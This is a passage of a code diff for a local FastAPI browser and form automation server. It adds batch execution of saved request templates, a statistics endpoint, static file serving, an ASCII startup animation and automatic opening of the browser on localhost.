+                    detect_csrf=template.detect_csrf
+                )
+
+                results.append({
+                    "template_id": template_id,
+                    "template_name": template.name,
+                    "url": template.url,
+                    "success": result.success,
+                    "status_code": result.status_code,
+                    "attempts": result.attempts,
+                    "timing": result.timing,
+                    "error": result.error_message if not result.success else None
+                })
+
+            except Exception as e:
+                logger.error(f"Failed to execute template {template_id}: {e}", exc_info=True)
+                results.append({
+                    "template_id": template_id,
+                    "template_name": template.name,
+                    "success": False,
+                    "error": str(e)
+                })
+
+        # Calculate summary
+        successful = sum(1 for r in results if r["success"])
+        failed = len(results) - successful
+
+        return {
+            "success": True,
+            "summary": {
+                "total": len(results),
+                "successful": successful,
+                "failed": failed
+            },
+            "results": results
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to execute batch: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.get("/api/saved-requests/stats")
+async def get_saved_requests_stats():
+    """Get statistics about saved templates"""
+    try:
+        manager = get_saved_request_manager()
+        stats = manager.get_stats()
+
+        return {
+            "success": True,
+            "stats": stats
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to get stats: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+# Static file serving (works in both dev and PyInstaller bundle)
+app.mount("/static", StaticFiles(directory=str(BASE_PATH / "static")), name="static")
+app.mount("/web", StaticFiles(directory=str(BASE_PATH / "web")), name="web")
+
+def show_startup_animation():
+    """Display cool startup animation with Gemini-style typewriter effect"""
+    import time
+    from colorama import Fore, Style, init
+    init()
+
+    def typewriter(text, delay=0.02, color="", end="\n"):
+        """Print text with typewriter effect like Gemini CLI"""
+        for char in text:
+            print(f"{color}{char}{Style.RESET_ALL}", end='', flush=True)
+            time.sleep(delay)
+        print(end=end)
+
+    # Clear screen
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+    # Large KPR ASCII art banner
+    kpr_banner = """
+██╗  ██╗██████╗ ██████╗
+██║ ██╔╝██╔══██╗██╔══██╗
+█████╔╝ ██████╔╝██████╔╝
+██╔═██╗ ██╔═══╝ ██╔══██╗
+██║  ██╗██║     ██║  ██║
+╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
+"""
+
+    for line in kpr_banner.strip().split('\n'):
+        typewriter(line, 0.005, Fore.CYAN)
+
+    print()
+    typewriter("Browser Automation Platform", 0.015, Fore.CYAN)
+    print()
+
+    # Loading steps with typewriter effect and faster delays
+    steps = [
+        ("Initializing browser engine", 0.1),
+        ("Loading automation modules", 0.08),
+        ("Preparing AI field mapper", 0.08),
+        ("Starting web server", 0.12),
+        ("Configuring network", 0.08),
+        ("Establishing secure connections", 0.08),
+        ("Ready to launch", 0.1)
+    ]
+
+    for step, delay in steps:
+        typewriter(f"▶ {step}...", 0.015, Fore.GREEN, end='')
+        time.sleep(delay)
+        print(f" {Fore.GREEN}✓{Style.RESET_ALL}")
+
+    print()
+    typewriter("━" * 54, 0.005, Fore.CYAN)
+    typewriter("✓ Server running on http://localhost:5511", 0.02, Fore.GREEN)
+    typewriter("⚠ Close this window to stop FormAI", 0.02, Fore.YELLOW)
+    typewriter("━" * 54, 0.005, Fore.CYAN)
+    print()
 
 if __name__ == "__main__":
-    # Run the server
+    import webbrowser
+    import threading
+    import time
+
+    # Skip startup animation when launched from test.bat
+    # show_startup_animation()
+
+    print("\nServer starting on http://localhost:5511")
+    print("Close this window to stop FormAI\n")
+
+    def open_browser():
+        """Open browser after a short delay"""
+        time.sleep(1)  # Short delay for server to start
+        try:
+            webbrowser.open("http://localhost:5511")
+        except:
+            pass  # Silently fail if browser can't open
+
+    # Start browser in background thread
+    threading.Thread(target=open_browser, daemon=True).start()
+
+    # Run the server (when terminal closes, this exits and server stops)
     uvicorn.run(
         app,
         host="127.0.0.1",
         port=5511,
-        log_level="warning",  # Changed from "info" to suppress WebSocket connection logs
+        log_level="error",  # Only show errors, suppress info/warning logs
         access_log=False
     )
